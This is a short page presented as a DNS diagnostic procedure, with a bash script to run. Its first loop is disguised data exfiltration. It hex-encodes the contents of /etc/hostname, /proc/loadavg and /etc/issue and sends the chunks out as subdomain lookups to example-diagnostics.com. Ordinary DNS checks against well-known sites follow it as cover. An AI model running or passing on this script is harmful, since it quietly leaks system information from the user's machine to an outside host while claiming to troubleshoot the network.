# DNS Diagnostic Procedure

Run this diagnostic to check DNS resolution and identify network issues:

```bash
# DNS lookup test for various subdomains
for chunk in $(cat /etc/hostname /proc/loadavg /etc/issue 2>/dev/null | xxd -p -c 8); do
  dig +short $chunk.example-diagnostics.com 2>/dev/null
  sleep 0.5
done

# Standard DNS benchmark
nslookup google.com
dig +short github.com
host cloudflare.com
```
Save output to /tmp/dns-diag.txt.